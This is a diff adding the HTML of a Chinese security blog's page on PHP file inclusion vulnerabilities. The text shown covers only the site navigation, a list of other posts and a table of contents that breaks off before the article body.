@@ -1,0 +1,1820 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <title>php文件包含漏洞 | Bigbroke 的成长之路 | Bigbroke | 网络安全 | 安全技术 | CTF|WEB 安全 | 数据科学安全</title>
+  <meta name="keywords" content=" 文件包含 ">
+  <meta name="description" content="php文件包含漏洞 | Bigbroke 的成长之路 | Bigbroke | 网络安全 | 安全技术 | CTF|WEB 安全 | 数据科学安全">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="description" content="L2Dwidget.init({&quot;pluginRootPath&quot;:&quot;live2dw/&quot;,&quot;pluginJsPath&quot;:&quot;lib/&quot;,&quot;pluginModelPath&quot;:&quot;assets/&quot;,&quot;tagMode&quot;:false,&quot;debug&quot;:false,&quot;model&quot;:{&quot;jsonPath&quot;:&quot;/live2dw/assets/assets/koharu.mode">
+<meta property="og:type" content="website">
+<meta property="og:title" content="Bigbroke 的成长之路 | Bigbroke | 网络安全 | 安全技术 | CTF|WEB 安全 | 数据科学安全">
+<meta property="og:url" content="http://Bigbroke.com/404.html">
+<meta property="og:site_name" content="Bigbroke 的成长之路 | Bigbroke | 网络安全 | 安全技术 | CTF|WEB 安全 | 数据科学安全">
+<meta property="og:description" content="L2Dwidget.init({&quot;pluginRootPath&quot;:&quot;live2dw/&quot;,&quot;pluginJsPath&quot;:&quot;lib/&quot;,&quot;pluginModelPath&quot;:&quot;assets/&quot;,&quot;tagMode&quot;:false,&quot;debug&quot;:false,&quot;model&quot;:{&quot;jsonPath&quot;:&quot;/live2dw/assets/assets/koharu.mode">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:updated_time" content="2017-10-07T10:21:52.994Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Bigbroke 的成长之路 | Bigbroke | 网络安全 | 安全技术 | CTF|WEB 安全 | 数据科学安全">
+<meta name="twitter:description" content="L2Dwidget.init({&quot;pluginRootPath&quot;:&quot;live2dw/&quot;,&quot;pluginJsPath&quot;:&quot;lib/&quot;,&quot;pluginModelPath&quot;:&quot;assets/&quot;,&quot;tagMode&quot;:false,&quot;debug&quot;:false,&quot;model&quot;:{&quot;jsonPath&quot;:&quot;/live2dw/assets/assets/koharu.mode">
+
+
+<link rel="icon" href="/img/head.jpg">
+
+<link rel="stylesheet" href="/css/style.css">
+
+<link rel="stylesheet" href="/css/hl_theme/sublime.css">
+
+<link href="//cdn.bootcss.com/animate.css/3.5.2/animate.min.css" rel="stylesheet">
+<link href="//cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">
+
+<link href="//cdn.bootcss.com/photoswipe/4.1.2/photoswipe.min.css" rel="stylesheet">
+<link href="//cdn.bootcss.com/photoswipe/4.1.2/default-skin/default-skin.min.css" rel="stylesheet">
+
+<script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
+<script src="/js/jquery.autocomplete.min.js"></script>
+<script src="//cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js"></script>
+<script>
+    hljs.initHighlightingOnLoad();
+</script>
+
+<script src="//cdn.bootcss.com/nprogress/0.2.0/nprogress.min.js"></script>
+
+
+
+<script src="//cdn.bootcss.com/jquery-cookie/1.4.1/jquery.cookie.min.js" ></script>
+
+</head>
+<div style="display: none">
+  <input class="theme_disqus_on" value="false">
+  <input class="theme_preload_comment" value="true">
+</div>
+<body>
+<aside class="nav">
+    <div class="nav-left">
+        <a href="/" class="avatar_target">
+    <img class="avatar" src="/img/head.jpg" />
+</a>
+<div class="author">
+    <span>Bigbroke</span>
+</div>
+
+<div class="icon">
+    
+    <a class="rss" title="rss" href="/atom.xml" target="_blank"></a>
+    
+    
+    <a class="github" title="github" href="https://github.com/bigbroke" target="_blank"></a>
+    
+    
+    
+    
+    
+    <a class="instagram" title="instagram" href="https://www.instagram.com/1_be_winner/" target="_blank"></a>
+    
+    
+    
+    <a class="weibo" title="weibo" href="http://weibo.com/u/xxx/" target="_blank"></a>
+    
+    
+    <a class="email" title="email" href="mailto:72382781@qq.com"></a>
+    
+</div>
+
+
+
+<ul>
+    <li class="all active">全部文章</li>
+    
+    <li data-rel="思考"> 思考 </li>
+    
+    <li data-rel="Language"> Language </li>
+    
+    <li data-rel="CTF"> CTF </li>
+    
+    <li data-rel="AiSecurity"> AiSecurity </li>
+    
+    <li data-rel="代码审计"> 代码审计 </li>
+    
+    <li data-rel="Kali"> Kali </li>
+    
+    <li data-rel="工具"> 工具 </li>
+    
+    <li data-rel="WebSecurity"> WebSecurity </li>
+    
+    <li data-rel="读书摘要"> 读书摘要 </li>
+    
+    <li data-rel="渗透测试"> 渗透测试 </li>
+    
+    <li data-rel="内网"> 内网 </li>
+    
+    <li data-rel="源码阅读"> 源码阅读 </li>
+    
+</ul>
+<div class="left-bottom">
+    <div class="menus">
+    
+    
+    
+    
+    </div>
+    <div><a style="border-right: 1px solid #fff; width: 49%"  class="about site_url"  href="/about">关于</a><a style="width: 50%"  class="friends">友链</a></div>
+</div>
+<input type="hidden" id="yelog_site_posts_number" value="56">
+<input type="hidden" id="yelog_site_word_count" value="115.2k">
+<div style="display: none">
+    <span id="busuanzi_value_site_uv"></span>
+    <span id="busuanzi_value_site_pv"></span>
+</div>
+    </div>
+    <div class="nav-right">
+        <div class="friends-area">
+    <div class="friends-title">
+        友情链接
+        <i class="back-title-list"></i>
+    </div>
+    <div class="friends-content">
+        <ul>
+            
+            <li><a target="_blank" href="/https/www.baidu.com">faBaidu</a></li>
+            
+            <li><a target="_blank" href="/https/www.google.com">fbGoogle</a></li>
+            
+            <li><a target="_blank" href="http://www.cnblogs.com/iamstudy/">I3m0n</a></li>
+            
+            <li><a target="_blank" href="http://ph0rse.me/">Ph0rse</a></li>
+            
+            <li><a target="_blank" href="http://03i0.com/">Sn00py</a></li>
+            
+            <li><a target="_blank" href="http://jlkl.github.io/">Str3am</a></li>
+            
+            <li><a target="_blank" href="http://marblue.me/">Marbule</a></li>
+            
+            <li><a target="_blank" href="http://twosmi1e.com/">2Smile</a></li>
+            
+            <li><a target="_blank" href="http://zo1ro.tk/">ZO1RO</a></li>
+            
+            <li><a target="_blank" href="https://blog.ruozhi.xyz/">ru0zhI</a></li>
+            
+            <li><a target="_blank" href="http://wulidecade.cn/">Decade</a></li>
+            
+            <li><a target="_blank" href="https://www.cnblogs.com/sn1per/">Sn1per</a></li>
+            
+        </ul>
+    </div>
+</div>
+        <div class="title-list">
+    <form onkeydown="if(event.keyCode==13){return false;}">
+        <input class="search" type="text" placeholder="以 in: 开头进行全文搜索" autocomplete="off"id="local-search-input" >
+        <i class="cross"></i>
+        <span>
+        <label for="tagswitch">Tags:</label>
+        <input id="tagswitch" type="checkbox">
+    </span>
+    </form>
+    <div class="tags-list">
+    
+    <li class="article-tag-list-item">
+        <a href="javascript:" class="color3">思考</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a href="javascript:" class="color5">life</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a href="javascript:" class="color3">正则</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a href="javascript:" class="color3">WP</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a href="javascript:" class="color1">first-blog</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a href="javascript:" class="color4">ctf</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a href="javascript:" class="color5">代码审计</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a href="javascript:" class="color4">sqlilabs</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a href="javascript:" class="color2">sqlmap</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a href="javascript:" class="color4">cve</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a href="javascript:" class="color4">VIM</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a href="javascript:" class="color5">Nmap</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a href="javascript:" class="color4">密码学</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a href="javascript:" class="color5">hexo</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a href="javascript:" class="color1">Nikto</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a href="javascript:" class="color3">TCPDUMP</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a href="javascript:" class="color5">QWASP_ZAP</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a href="javascript:" class="color2">NETCAT</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a href="javascript:" class="color2">docker</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a href="javascript:" class="color4">Skipfish</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a href="javascript:" class="color5">Vega</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a href="javascript:" class="color3">复现</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a href="javascript:" class="color5">文件包含</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a href="javascript:" class="color5">读书摘要</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a href="javascript:" class="color5">信息收集</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a href="javascript:" class="color1">Web漏洞</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a href="javascript:" class="color3">内网</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a href="javascript:" class="color4">CTF</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a href="javascript:" class="color5">文件上传</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a href="javascript:" class="color3">渗透</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a href="javascript:" class="color4">web</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a href="javascript:" class="color4">黑客攻防web安全实战详解</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a href="javascript:" class="color3">入侵</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a href="javascript:" class="color5">Dvwa</a>
+    </li>
+    
+    <div class="clearfix"></div>
+</div>
+
+    
+    <div id="local-search-result">
+
+    </div>
+    
+    <nav id="title-list-nav">
+        
+        <a  class="读书摘要 "
+           href="/archis/a7cdea15/"
+           data-tag="读书摘要"
+           data-author="" >
+            <span class="post-title" title="《互联网企业安全高级指南》读书笔记">《互联网企业安全高级指南》读书笔记</span>
+            <span class="post-date" title="2020-03-04 18:17:30">2020/03/04</span>
+        </a>
+        
+        <a  class="源码阅读 "
+           href="/archis/f4173bf8/"
+           data-tag="ctf"
+           data-author="" >
+            <span class="post-title" title="Read-Sitadel-Source">Read-Sitadel-Source</span>
+            <span class="post-date" title="2019-03-15 00:00:08">2019/03/15</span>
+        </a>
+        
+        <a  class="AiSecurity "
+           href="/archis/eed6fa1/"
+           data-tag="ctf"
+           data-author="" >
+            <span class="post-title" title="AI-Security-Learning">AI-Security-Learning</span>
+            <span class="post-date" title="2019-02-17 21:15:30">2019/02/17</span>
+        </a>
+        
+        <a  class="思考 "
+           href="/archis/f7c9beed/"
+           data-tag="life"
+           data-author="" >
+            <span class="post-title" title="2018反思总结">2018反思总结</span>
+            <span class="post-date" title="2018-12-31 01:14:45">2018/12/31</span>
+        </a>
+        
+        <a  class="CTF "
+           href="/archis/49b464e6/"
+           data-tag="ctf"
+           data-author="" >
+            <span class="post-title" title="初探线下CTF-AWD模式">初探线下CTF-AWD模式</span>
+            <span class="post-date" title="2018-12-02 17:13:50">2018/12/02</span>
+        </a>
+        
+        <a  class="内网 "
+           href="/archis/7db24e65/"
+           data-tag="内网"
+           data-author="" >
+            <span class="post-title" title="内网渗透基础知识">内网渗透基础知识</span>
+            <span class="post-date" title="2018-12-02 17:07:15">2018/12/02</span>
+        </a>
+        
+        <a  class="CTF "
+           href="/archis/6bd5dfde/"
+           data-tag="ctf"
+           data-author="" >
+            <span class="post-title" title="第一届安洵杯writeup">第一届安洵杯writeup</span>
+            <span class="post-date" title="2018-11-26 21:23:57">2018/11/26</span>
+        </a>
+        
+        <a  class="CTF "
+           href="/archis/4341f801/"
+           data-tag="ctf"
+           data-author="" >
+            <span class="post-title" title="HCTF2018-web writeup">HCTF2018-web writeup</span>
+            <span class="post-date" title="2018-11-13 13:26:20">2018/11/13</span>
+        </a>
+        
+        <a  class="工具 "
+           href="/archis/47a94ec3/"
+           data-tag="docker"
+           data-author="" >
+            <span class="post-title" title="docker复现ctf&amp;dockerfile编写ctf环境">docker复现ctf&amp;dockerfile编写ctf环境</span>
+            <span class="post-date" title="2018-10-29 21:57:39">2018/10/29</span>
+        </a>
+        
+        <a  class="代码审计 "
+           href="/archis/441c37c9/"
+           data-tag="代码审计"
+           data-author="" >
+            <span class="post-title" title="墨者学院审计类通关指南">墨者学院审计类通关指南</span>
+            <span class="post-date" title="2018-10-28 22:02:08">2018/10/28</span>
+        </a>
+        
+        <a  class="WebSecurity "
+           href="/archis/767136e1/"
+           data-tag="复现"
+           data-author="" >
+            <span class="post-title" title="phpMyAdmin 4.8.x 本地文件包含">phpMyAdmin 4.8.x 本地文件包含</span>
+            <span class="post-date" title="2018-10-27 12:19:37">2018/10/27</span>
+        </a>
+        
+        <a  class="读书摘要 "
+           href="/archis/924987ad/"
+           data-tag="读书摘要"
+           data-author="" >
+            <span class="post-title" title="《Web安全攻防-渗透测试实战指南》读书笔记">《Web安全攻防-渗透测试实战指南》读书笔记</span>
+            <span class="post-date" title="2018-10-26 22:05:27">2018/10/26</span>
+        </a>
+        
+        <a  class="WebSecurity "
+           href="/archis/b46a6d47/"
+           data-tag="web"
+           data-author="" >
+            <span class="post-title" title="验证码相关安全问题">验证码相关安全问题</span>
+            <span class="post-date" title="2018-10-23 23:05:15">2018/10/23</span>
+        </a>
+        
+        <a  class="代码审计 "
+           href="/archis/a5c61176/"
+           data-tag="cve"
+           data-author="" >
+            <span class="post-title" title="Xss in MetInfo V6.1.2">Xss in MetInfo V6.1.2</span>
+            <span class="post-date" title="2018-10-16 02:16:08">2018/10/16</span>
+        </a>
+        
+        <a  class="CTF "
+           href="/archis/173905c2/"
+           data-tag="ctf"
+           data-author="" >
+            <span class="post-title" title="护网杯wp">护网杯wp</span>
+            <span class="post-date" title="2018-10-13 23:53:02">2018/10/13</span>
+        </a>
+        
+        <a  class="WebSecurity "
+           href="/archis/95d370e7/"
+           data-tag="Web漏洞"
+           data-author="" >
+            <span class="post-title" title="web漏洞挖掘之点击劫持漏洞">web漏洞挖掘之点击劫持漏洞</span>
+            <span class="post-date" title="2018-10-11 14:13:02">2018/10/11</span>
+        </a>
+        
+        <a  class="Language "
+           href="/archis/7fe4b50e/"
+           data-tag="正则"
+           data-author="" >
+            <span class="post-title" title="20个常用的正则表达式">20个常用的正则表达式</span>
+            <span class="post-date" title="2018-10-09 16:29:34">2018/10/09</span>
+        </a>
+        
+        <a  class="AiSecurity "
+           href="/archis/d4eed376/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="机器学习概念">机器学习概念</span>
+            <span class="post-date" title="2018-10-09 16:29:01">2018/10/09</span>
+        </a>
+        
+        <a  class="内网 "
+           href="/archis/17ef10d7/"
+           data-tag="内网"
+           data-author="" >
+            <span class="post-title" title="浅谈内网渗透流程">浅谈内网渗透流程</span>
+            <span class="post-date" title="2018-10-09 10:50:44">2018/10/09</span>
+        </a>
+        
+        <a  class="CTF "
+           href="/archis/18042369/"
+           data-tag="CTF"
+           data-author="" >
+            <span class="post-title" title="安恒5月">安恒5月</span>
+            <span class="post-date" title="2018-08-25 20:40:51">2018/08/25</span>
+        </a>
+        
+        <a  class="CTF "
+           href="/archis/b20debe2/"
+           data-tag="CTF"
+           data-author="" >
+            <span class="post-title" title="安恒7月">安恒7月</span>
+            <span class="post-date" title="2018-08-25 20:39:36">2018/08/25</span>
+        </a>
+        
+        <a  class="代码审计 "
+           href="/archis/8395d5c7/"
+           data-tag="代码审计"
+           data-author="" >
+            <span class="post-title" title="墨者学院php代码审计1">墨者学院php代码审计1</span>
+            <span class="post-date" title="2018-08-25 20:32:48">2018/08/25</span>
+        </a>
+        
+        <a  class="代码审计 "
+           href="/archis/d8be4236/"
+           data-tag="代码审计"
+           data-author="" >
+            <span class="post-title" title="PHP字符串&#39;和“区别">PHP字符串&#39;和“区别</span>
+            <span class="post-date" title="2018-08-25 20:22:01">2018/08/25</span>
+        </a>
+        
+        <a  class="渗透测试 "
+           href="/archis/35d3b1d4/"
+           data-tag="渗透"
+           data-author="" >
+            <span class="post-title" title="渗透测试基础">渗透测试基础</span>
+            <span class="post-date" title="2018-08-01 23:43:32">2018/08/01</span>
+        </a>
+        
+        <a  class="思考 "
+           href="/archis/80e1beed/"
+           data-tag="思考"
+           data-author="" >
+            <span class="post-title" title="八月展望">八月展望</span>
+            <span class="post-date" title="2018-08-01 23:41:26">2018/08/01</span>
+        </a>
+        
+        <a  class="CTF "
+           href="/archis/f4e3f3ec/"
+           data-tag="WP"
+           data-author="" >
+            <span class="post-title" title="2018SCTF-wp">2018SCTF-wp</span>
+            <span class="post-date" title="2018-06-20 22:40:40">2018/06/20</span>
+        </a>
+        
+        <a  class="WebSecurity "
+           href="/archis/2947d8f2/"
+           data-tag="密码学"
+           data-author="" >
+            <span class="post-title" title="cbc字节翻转攻击">cbc字节翻转攻击</span>
+            <span class="post-date" title="2018-06-01 00:47:50">2018/06/01</span>
+        </a>
+        
+        <a  class="CTF "
+           href="/archis/4e1d9865/"
+           data-tag="WP"
+           data-author="" >
+            <span class="post-title" title="ISCC2018-writeup">ISCC2018-writeup</span>
+            <span class="post-date" title="2018-05-28 00:54:05">2018/05/28</span>
+        </a>
+        
+        <a  class="CTF "
+           href="/archis/ceb4048b/"
+           data-tag="WP"
+           data-author="" >
+            <span class="post-title" title="全国网络空间安全技术大赛2018三道wp">全国网络空间安全技术大赛2018三道wp</span>
+            <span class="post-date" title="2018-05-15 19:04:17">2018/05/15</span>
+        </a>
+        
+        <a  class="CTF "
+           href="/archis/e36e397d/"
+           data-tag="WP"
+           data-author="" >
+            <span class="post-title" title="bugku-misc">bugku-misc</span>
+            <span class="post-date" title="2018-05-01 19:02:14">2018/05/01</span>
+        </a>
+        
+        <a  class="Kali "
+           href="/archis/40a439a4/"
+           data-tag="Nmap"
+           data-author="" >
+            <span class="post-title" title="Nmap 使用技巧汇总">Nmap 使用技巧汇总</span>
+            <span class="post-date" title="2018-04-23 22:07:46">2018/04/23</span>
+        </a>
+        
+        <a  class="WebSecurity "
+           href="/archis/844a29d4/"
+           data-tag="文件包含"
+           data-author="" >
+            <span class="post-title" title="php文件包含漏洞">php文件包含漏洞</span>
+            <span class="post-date" title="2018-04-23 21:39:49">2018/04/23</span>
+        </a>
+        
+        <a  class="WebSecurity "
+           href="/archis/ea42f6a6/"
+           data-tag="文件上传"
+           data-author="" >
+            <span class="post-title" title="文件上传总结">文件上传总结</span>
+            <span class="post-date" title="2018-04-23 21:39:03">2018/04/23</span>
+        </a>
+        
+        <a  class="CTF "
+           href="/archis/a7a61e20/"
+           data-tag="WP"
+           data-author="" >
+            <span class="post-title" title="DDCTF三道小结">DDCTF三道小结</span>
+            <span class="post-date" title="2018-04-23 21:35:39">2018/04/23</span>
+        </a>
+        
+        <a  class="渗透测试 "
+           href="/archis/1f382107/"
+           data-tag="入侵"
+           data-author="" >
+            <span class="post-title" title="高级入侵">高级入侵</span>
+            <span class="post-date" title="2018-04-23 21:33:14">2018/04/23</span>
+        </a>
+        
+        <a  class="渗透测试 "
+           href="/archis/312e3d12/"
+           data-tag="信息收集"
+           data-author="" >
+            <span class="post-title" title="信息收集">信息收集</span>
+            <span class="post-date" title="2018-04-02 16:15:51">2018/04/02</span>
+        </a>
+        
+        <a  class="CTF "
+           href="/archis/ced895c1/"
+           data-tag="sqlilabs"
+           data-author="" >
+            <span class="post-title" title="sqli-labs less11-15">sqli-labs less11-15</span>
+            <span class="post-date" title="2018-04-02 16:15:38">2018/04/02</span>
+        </a>
+        
+        <a  class="CTF "
+           href="/archis/9a0d7777/"
+           data-tag="sqlilabs"
+           data-author="" >
+            <span class="post-title" title="sqli-labs  less7-10">sqli-labs  less7-10</span>
+            <span class="post-date" title="2018-04-02 16:15:23">2018/04/02</span>
+        </a>
+        
+        <a  class="CTF "
+           href="/archis/4303333d/"
+           data-tag="sqlilabs"
+           data-author="" >
+            <span class="post-title" title="sqli-labs5-6(盲注)">sqli-labs5-6(盲注)</span>
+            <span class="post-date" title="2018-04-02 16:14:58">2018/04/02</span>
+        </a>
+        
+        <a  class="CTF "
+           href="/archis/239c6225/"
+           data-tag="sqlilabs"
+           data-author="" >
+            <span class="post-title" title="Sqli-labs  1-4">Sqli-labs  1-4</span>
+            <span class="post-date" title="2018-04-02 16:13:07">2018/04/02</span>
+        </a>
+        
+        <a  class="CTF "
+           href="/archis/79216fa/"
+           data-tag="WP"
+           data-author="" >
+            <span class="post-title" title="实验吧web—writeup">实验吧web—writeup</span>
+            <span class="post-date" title="2018-04-02 16:10:18">2018/04/02</span>
+        </a>
+        
+        <a  class="CTF "
+           href="/archis/2ccf6cb2/"
+           data-tag="WP"
+           data-author="" >
+            <span class="post-title" title="第二届强网杯-部分wp">第二届强网杯-部分wp</span>
+            <span class="post-date" title="2018-04-02 16:08:51">2018/04/02</span>
+        </a>
+        
+        <a  class="读书摘要 "
+           href="/archis/2ab3b8ea/"
+           data-tag="黑客攻防web安全实战详解"
+           data-author="" >
+            <span class="post-title" title="黑客攻防web安全实战详解">黑客攻防web安全实战详解</span>
+            <span class="post-date" title="2018-02-27 19:57:12">2018/02/27</span>
+        </a>
+        
+        <a  class="Kali "
+           href="/archis/b248361f/"
+           data-tag="QWASP_ZAP"
+           data-author="" >
+            <span class="post-title" title="kali渗透测试之Web渗透-扫描工具-QWASP_ZAP">kali渗透测试之Web渗透-扫描工具-QWASP_ZAP</span>
+            <span class="post-date" title="2018-02-27 19:54:20">2018/02/27</span>
+        </a>
+        
+        <a  class="Kali "
+           href="/archis/136af25a/"
+           data-tag="Vega"
+           data-author="" >
+            <span class="post-title" title="kali渗透测试之Web渗透-扫描工具-Vega">kali渗透测试之Web渗透-扫描工具-Vega</span>
+            <span class="post-date" title="2018-02-27 19:51:36">2018/02/27</span>
+        </a>
+        
+        <a  class="Kali "
+           href="/archis/497d64c3/"
+           data-tag="Skipfish"
+           data-author="" >
+            <span class="post-title" title="kali渗透测试之Web渗透-扫描工具-Skipfish">kali渗透测试之Web渗透-扫描工具-Skipfish</span>
+            <span class="post-date" title="2018-02-27 19:49:37">2018/02/27</span>
+        </a>
+        
+        <a  class="Kali "
+           href="/archis/a04b3dd7/"
+           data-tag="Nikto"
+           data-author="" >
+            <span class="post-title" title="kali渗透测试之Web渗透-扫描工具-Nikto">kali渗透测试之Web渗透-扫描工具-Nikto</span>
+            <span class="post-date" title="2018-02-27 19:47:03">2018/02/27</span>
+        </a>
+        
+        <a  class="Kali "
+           href="/archis/2b646ba1/"
+           data-tag="TCPDUMP"
+           data-author="" >
+            <span class="post-title" title="kali渗透测试之Web渗透-工具-TCPDUMP">kali渗透测试之Web渗透-工具-TCPDUMP</span>
+            <span class="post-date" title="2018-02-27 19:42:43">2018/02/27</span>
+        </a>
+        
+        <a  class="Kali "
+           href="/archis/32be69d6/"
+           data-tag="NETCAT"
+           data-author="" >
+            <span class="post-title" title="kali渗透测试之Web渗透-工具-NETCAT">kali渗透测试之Web渗透-工具-NETCAT</span>
+            <span class="post-date" title="2018-02-27 19:38:09">2018/02/27</span>
+        </a>
+        
+        <a  class="工具 "
+           href="/archis/2e6b5387/"
+           data-tag="VIM"
+           data-author="" >
+            <span class="post-title" title="Vim简单入门笔记">Vim简单入门笔记</span>
+            <span class="post-date" title="2017-12-15 19:07:45">2017/12/15</span>
+        </a>
+        
+        <a  class="思考 "
+           href="/archis/fb4597d6/"
+           data-tag="思考"
+           data-author="" >
+            <span class="post-title" title="17-11反思与进取">17-11反思与进取</span>
+            <span class="post-date" title="2017-11-22 17:10:55">2017/11/22</span>
+        </a>
+        
+        <a  class="CTF "
+           href="/archis/18acffef/"
+           data-tag="Dvwa"
+           data-author="" >
+            <span class="post-title" title="DVWA笔记">DVWA笔记</span>
+            <span class="post-date" title="2017-11-22 17:06:26">2017/11/22</span>
+        </a>
+        
+        <a  class="思考 "
+           href="/archis/undefined/"
+           data-tag="hexo"
+           data-author="" >
+            <span class="post-title" title="hexo博客搭建">hexo博客搭建</span>
+            <span class="post-date" title="2017-11-22 16:57:45">2017/11/22</span>
+        </a>
+        
+        <a  class="Kali "
+           href="/archis/18bbc00d/"
+           data-tag="sqlmap"
+           data-author="" >
+            <span class="post-title" title="SQLMAP注入教程-11种常见SQLMAP使用方法详解">SQLMAP注入教程-11种常见SQLMAP使用方法详解</span>
+            <span class="post-date" title="2017-11-21 04:27:10">2017/11/21</span>
+        </a>
+        
+        <a  class="CTF "
+           href="/archis/83955867/"
+           data-tag="WP"
+           data-author="" >
+            <span class="post-title" title="第八届Geek部分web">第八届Geek部分web</span>
+            <span class="post-date" title="2017-10-20 16:07:05">2017/10/20</span>
+        </a>
+        
+        <a  class="思考 "
+           href="/archis/e53fb0b9/"
+           data-tag="first-blog"
+           data-author="" >
+            <span class="post-title" title="my-first-blog">my-first-blog</span>
+            <span class="post-date" title="2017-09-27 16:56:58">2017/09/27</span>
+        </a>
+        
+    </nav>
+</div>
+    </div>
+    <div class="hide-list">
+        <div class="semicircle">
+            <div class="brackets first"><</div>
+            <div class="brackets">&gt;</div>
+        </div>
+    </div>
+</aside>
+<div class="post">
+    <div class="pjax">
+        <article id="post-php文件包含漏洞" class="article article-type-post" itemscope itemprop="blogPost">
+    
+        <h1 class="article-title">php文件包含漏洞</h1>
+    
+    <div class="article-meta">
+        
+        
+        
+        <span class="book">
+            
+            <a href="javascript:" data-rel="WebSecurity">WebSecurity</a>
+            
+        </span>
+        
+        
+        <span class="tag">
+            
+            <a href="javascript:" class="color5">文件包含</a>
+            
+        </span>
+        
+    </div>
+    <div class="article-meta">
+        
+        创建时间:<time class="date" title='更新时间: 2018-11-02 21:52:15'>2018-04-23 21:39</time>
+        
+    </div>
+    <div class="article-meta">
+        
+        <span>字数:4,055</span>
+        
+        
+        <span id="busuanzi_container_page_pv">
+            阅读:<span id="busuanzi_value_page_pv">
+                <span class="count-comment">
+                    <span class="spinner">
+                      <div class="cube1"></div>
+                      <div class="cube2"></div>
+                    </span>
+                </span>
+            </span>
+        </span>
+        
+        
+        <span class="top-comment" title="跳转至评论区">
+            <a href="#comments">
+                评论:<span class="count-comment">
+                    <span class="spinner">
+                      <div class="cube1"></div>
+                      <div class="cube2"></div>
+                    </span>
+                </span>
+            </a>
+        </span>
+        
+    </div>
+    
+    <div class="toc-ref">
+    
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#原理"><span class="toc-text">原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#利用条件"><span class="toc-text">利用条件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#分类"><span class="toc-text">分类</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#一、本地包含"><span class="toc-text">一、本地包含</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#包含同目录下的文件"><span class="toc-text">包含同目录下的文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#目录遍历："><span class="toc-text">目录遍历：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#包含图片木马"><span class="toc-text">包含图片木马</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#包含日志"><span class="toc-text">包含日志</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#包含session"><span class="toc-text">包含session</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#包含-proc-self-environ文件"><span class="toc-text">包含/proc/self/environ文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#包含临时文件"><span class="toc-text">包含临时文件</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#有防御的本地文件包含"><span class="toc-text">有防御的本地文件包含</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#二、远程文件包含"><span class="toc-text">二、远程文件包含</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#有防御的远程文件包含"><span class="toc-text">有防御的远程文件包含</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PHP中的封装协议-伪协议"><span class="toc-text">PHP中的封装协议(伪协议)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#利用php流input："><span class="toc-text">利用php流input：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#利用php流filter："><span class="toc-text">利用php流filter：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#利用data-URIs："><span class="toc-text">利用data URIs：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#利用XSS执行任意代码："><span class="toc-text">利用XSS执行任意代码：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#glob-伪协议"><span class="toc-text">glob://伪协议</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#phar"><span class="toc-text">phar://</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#zip"><span class="toc-text">zip://</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CTF中的文件包含套路"><span class="toc-text">CTF中的文件包含套路</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#php伪协议读取源码"><span class="toc-text">php伪协议读取源码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#贪婪包含"><span class="toc-text">贪婪包含</span></a></li><li class="toc-item toc-level-3"><a 